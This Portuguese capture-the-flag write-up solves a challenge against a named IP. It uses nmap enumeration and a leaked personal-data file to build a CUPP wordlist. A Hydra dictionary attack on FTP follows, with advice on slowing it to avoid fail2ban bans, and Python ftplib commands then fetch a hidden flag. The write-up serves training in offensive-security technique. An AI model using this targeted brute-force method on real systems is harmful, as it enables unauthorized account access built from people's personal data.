# 📦 Pensando Fora da Caixa

**Categoria:** CTF — Offensive Security · **Pontuação:** 100 pts (+ bônus first blood)
**Alvo:** `http://45.55.126.134/`
**Flag:** `FIAP{ON1765441111119877}`

## Enunciado / Dicas fornecidas

1. Baixar `/backups/pessoal.txt` e mapear os dados nos campos pedidos pelo `cupp -i` (nome, sobrenome, apelido, nascimento, parceiro(a), filho(a)...).
2. A dica menciona "caracteres" — usar a opção do `cupp` que adiciona caractere especial ao final da palavra (padrão real-world: `Palavra!`, `Palavra@`, etc.), **sem** leet speak e **sem** números aleatórios.
3. Mapear quais serviços do alvo autenticam por usuário/senha (a porta 80 é só o site estático, sem formulário de login).
4. Usuário mais provável: `ubirajara` (primeiro nome, em minúsculo, do arquivo pessoal).

## Metodologia

### 1. Enumeração de serviços

```bash
nmap -sV -p- --min-rate 1000 45.55.126.134
```

```text
PORT     STATE    SERVICE      VERSION
21/tcp   open     ftp          ProFTPD
22/tcp   open     ssh          OpenSSH 9.2p1 Debian
80/tcp   open     http         Apache httpd 2.4.68 ((Debian))
```

O site na porta 80 foi vasculhado por completo (todas as páginas e `/assets/`) e não possui nenhum formulário de login — logo, o alvo de autenticação é **FTP** ou **SSH**.

### 2. Coleta do dado vazado

```bash
curl -s http://45.55.126.134/backups/pessoal.txt
```

O arquivo trouxe dados pessoais de um colaborador fictício ("Ubirajara Augusto Alves" e dados relacionados — sobrenome, apelido, nomes de familiares), usados como insumo para o dicionário.

### 3. Geração do dicionário com CUPP

```bash
cupp -i
```

Campos preenchidos com os dados do `pessoal.txt`; na pergunta *"Do you want to add some special chars at the end of words?"* → **Y** (é exatamente o padrão sugerido pela dica: "palavra + caractere"), mantendo leet mode e números aleatórios **desligados** para não diluir a lista com ruído.

```text
[+] Saving dictionary to ubirajara.txt, counting 11776 words.
```

### 4. Ataque de dicionário (Hydra)

```bash
hydra -l ubirajara -P ubirajara.txt ftp://45.55.126.134 -t 4 -f -V
```

Primeiras tentativas esbarraram em bloqueio temporário por excesso de conexões simultâneas (proteção anti-bruteforce do ProFTPD/fail2ban — a porta chegou a ficar `closed`/`Conexão recusada` por alguns minutos). A lição aqui foi reduzir a concorrência (`-t 1`) e espaçar as tentativas até a porta voltar a responder.

### 5. Acesso ao FTP e captura da flag

Com a credencial válida (`ubirajara` / senha derivada do dicionário baseado nos dados pessoais), o acesso ao FTP revelou que a listagem padrão (`LIST`) não mostra arquivos ocultos — foi necessário usar `LIST -a`:

```bash
python3 -c 'import ftplib; f=ftplib.FTP("45.55.126.134"); f.login("ubirajara","<senha>"); print("Diretorio:",f.pwd()); f.retrlines("LIST -a"); f.quit()'
```

```text
dr-x------   2 ubirajara ubirajara     4096 Apr 23  2024 .
dr-x------   2 ubirajara ubirajara     4096 Apr 23  2024 ..
-rw-r--r--   1 0        0              25 Apr 23  2024 .flag
```

```bash
python3 -c 'import ftplib; f=ftplib.FTP("45.55.126.134"); f.login("ubirajara","<senha>"); f.retrlines("RETR .flag"); f.quit()'
```

## Flag

```
FIAP{ON1765441111119877}
```

## Lição aprendida

- OSINT/vazamento de dados pessoais (mesmo "internos", como um arquivo de backup esquecido) alimenta ataques de dicionário direcionados — muito mais eficazes que wordlists genéricas (`rockyou.txt`) contra senhas com padrão previsível ("nome + símbolo").
- Servidores FTP/SSH com proteção anti-bruteforce (fail2ban) exigem ataques mais lentos e cirúrgicos — velocidade não compensa quando o IP é banido a cada poucas tentativas.
- Listagens de diretório (`ls`/`LIST`) escondem arquivos ocultos por padrão; sempre verificar com a flag `-a`.
